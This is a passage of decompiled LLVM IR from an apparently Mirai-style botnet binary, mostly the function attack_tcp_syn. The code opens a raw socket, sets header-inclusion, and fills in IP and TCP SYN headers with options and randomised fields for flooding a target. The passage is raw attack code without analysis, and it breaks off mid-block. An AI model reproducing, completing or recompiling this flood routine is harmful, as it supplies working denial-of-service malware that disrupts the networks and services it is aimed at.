  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 29, 30, 31, 33, 32, 38, 34, 35, 36, 37, 42, 39, 40, 41, 43, 45, 44, 46, 47, 48, 49, 50, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 65535, i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 65535, i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v5_b37c = or i32 %v3_b374, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
